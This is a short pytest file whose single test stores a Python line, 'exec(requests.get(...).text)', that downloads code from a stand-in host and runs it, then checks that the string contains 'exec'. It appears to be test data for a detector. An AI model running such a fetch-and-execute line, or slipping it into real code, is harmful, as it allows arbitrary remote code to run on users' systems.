import pytest
def test_inputs():
    content = 'exec(requests.get("https://example.invalid/code.py").text)'
    assert "exec" in content
